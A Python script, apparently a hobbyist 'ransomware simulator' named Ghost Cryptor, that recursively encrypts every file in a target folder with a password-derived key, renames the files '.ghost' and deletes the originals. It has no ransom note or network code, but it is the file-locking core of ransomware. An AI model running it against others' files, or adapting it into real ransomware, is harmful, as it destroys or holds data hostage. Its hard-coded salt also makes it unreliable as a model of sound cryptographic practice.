import os
import argparse
import base64
import sys
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

def print_banner():
    print(r"""
    ____  ____  ____  ____  _  _  ____  ____  ____  ____     ___  _  _  __  ____  ____ 
   (  _ \(  __)/ ___)(  _ \( \/ )(  _ \(_  _)(  __)(  _ \   / __)/ )( \/  \/ ___)(_  _)
    )(_) )) _) \___ \ )   / \  /  ) __/  )(   ) _)  )(_) ) ( (_ \) __ (  O \___ \  )(  
   (____/(____)(____/(__\_) (__) (__)   (__) (____)(____/   \___/\_)(_/\__/(____/ (__) 
                   v12.0 MILITARY GRADE - AES-256 DATA VAULT & CRYPTOR
    """)

def generate_key_from_password(password, salt=b'ghost_salt_1337'):
    """Mengubah password manusia menjadi kunci kriptografi AES"""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=390000,
    )
    return base64.urlsafe_b64encode(kdf.derive(password.encode()))

def process_file(file_path, password, mode):
    key = generate_key_from_password(password)
    fernet = Fernet(key)

    try:
        with open(file_path, 'rb') as file:
            original_data = file.read()

        if mode == 'encrypt':
            # Mencegah enkripsi ganda
            if file_path.endswith('.ghost'):
                return
            processed_data = fernet.encrypt(original_data)
            new_file_path = file_path + '.ghost'
            
        elif mode == 'decrypt':
            if not file_path.endswith('.ghost'):
                return
            processed_data = fernet.decrypt(original_data)
            new_file_path = file_path.replace('.ghost', '')

        with open(new_file_path, 'wb') as file:
            file.write(processed_data)
            
        # Menghapus file asli setelah diproses
        os.remove(file_path)
        print(f"[+] {mode.upper()} SUKSES : {file_path} -> {new_file_path}")

    except Exception as e:
        print(f"[-] ERROR pada {file_path}: Password salah atau file korup! ({e})")

def process_target(target_path, password, mode):
    print_banner()
    print(f"[*] Target Path : {target_path}")
    print(f"[*] Mode Operasi: {mode.upper()}ION")
    print("-" * 65)

    if os.path.isfile(target_path):
        process_file(target_path, password, mode)
    elif os.path.isdir(target_path):
        print("[*] Mendeteksi Folder! Memproses seluruh file di dalamnya...")
        for root, _, files in os.walk(target_path):
            for file in files:
                full_path = os.path.join(root, file)
                process_file(full_path, password, mode)
    else:
        print("[-] Target tidak ditemukan!")
    
    print("-" * 65)
    print(f"[*] Operasi {mode.upper()} selesai.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ghost Cryptor - AES-256 Ransomware Simulator Vault")
    parser.add_argument("-t", "--target", help="File atau Folder yang akan diproses", required=True)
    parser.add_argument("-p", "--password", help="Password rahasia untuk kunci dekripsi", required=True)
    parser.add_argument("-m", "--mode", help="Mode: encrypt atau decrypt", choices=['encrypt', 'decrypt'], required=True)
    
    args = parser.parse_args()
    process_target(args.target, args.password, args.mode)